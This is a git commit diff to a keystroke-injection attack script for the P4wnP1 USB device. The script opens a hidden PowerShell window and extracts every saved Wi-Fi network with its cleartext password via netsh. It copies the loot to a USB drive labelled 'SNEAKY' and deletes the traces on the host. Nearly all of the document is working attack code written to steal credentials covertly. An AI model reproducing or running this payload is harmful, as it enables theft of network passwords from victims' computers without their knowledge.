810baa3ba666959f376ac58017e255e570afd10e
Calvin L <47407549+Coderdude112@users.noreply.github.com>
2020-05-31 21:37:47 -0600

    Update WifiKeysExtractor.js

--- HID-Scripts/WifiKeysExtractor.js
+++ HID-Scripts/WifiKeysExtractor.js
@@ -1,30 +1,33 @@
-// Windows File Exfiltrator
+// Wifi Keys Exfiltrator
 // Author: PingDucKY https://github.com/PingDucKY/payloads-P4wnP1-A.L.O.A
 // Edited by: Coderdude112 on GitHub 
 // This attack extracts info on saved wifi networks and their passwords
 
-layout('us');				    // Set keyboard layout to US
+layout('us');				// Set keyboard layout to US
 var Ready = "False"			// Sets Ready to false beacuse we are not ready to begin the attack
 
 function Attack() { 		// Initalizes the function Attack that acually exfiltrates the files
-  delay(2200);				  // Delay to make sure that File Explorer doesent take focus
+  delay(2200);				// Delay to make sure that File Explorer doesent take focus
   press("GUI r");		  	// Opens a run command
   delay(500);
-  type("powershell\n");	// Opens powershell
+  type("powershell\n");		// Opens powershell
   delay(500);
   
-  type("powershell -windowstyle hidden {"); 									// Makes the window hidden for the duration of the attack
+  type("powershell -windowstyle hidden {"); 													// Makes the window hidden for the duration of the attack
   type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name;");	// Find the drive named "SNEAKY" and save it's path
+  type("$exfilPath = \"Loot\\Wifi-Keys\";");													// Save the loot path to exfilPath
+  type("$totalPath = $usbPath.name + $exfilPath;");												// Save the total path for the loot including the drive letter to totalPath
+  type("mkdir $totalPath;");																	// Makes the loot directory
   
-  type("netsh wlan show profiles * > wirelessinfo.txt;");			// Gets the WIFI info and stores it in a txt file
-  type("copy wirelessinfo.txt $usbpath.name;");								// Copyies wirelesspassword to the USB
-  type("del wirelessinfo.txt;");															// Delets the copy of wirelessinfo on the host
+  type("netsh wlan show profiles * > wirelessinfo.txt;");										// Gets the WIFI info and stores it in a txt file
+  type("copy wirelessinfo.txt $totalPath;");													// Copyies wirelesspassword to the USB
+  type("del wirelessinfo.txt;");																// Delets the copy of wirelessinfo on the host
   
   type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > wifikeys.txt;'); // Gets the keys to the wifi networks
-  type("copy wifikeys.txt $usbpath.name;");										// Copies wifikeys to the USB
+  type("copy wifikeys.txt $totalPath;");														// Copies wifikeys to the USB
   type("del wifikeys.txt;");																	// Deletes the copy of wifikeys stored on the host
   
-  type("}\n");  																				      // Adds the close curly bracket making the attack hidden and starts the attack
+  type("}\n");  																				// Adds the close curly bracket making the attack hidden and starts the attack
 }
 
 function Initalized() { 	// Initalizes the function that checks if the device has been initalized by the host before running the attack
@@ -35,12 +38,12 @@ function Initalized() { 	// Initalizes the function that checks if the device ha
     if (result.SCROLL) { 	// If this is true then the device is initalized. The loop will break and the attack will start
       Ready = "True";
       break;   
-    } else {				      // The device is not initalized so we will press scroll lock and retry
+    } else {				// The device is not initalized so we will press scroll lock and retry
         press("SCROLL");
       }
     
   }
 }
 
-Initalized(); 		// Check if the host has initalized us
+Initalized(); 				// Check if the host has initalized us
 Attack();					// Run the attack
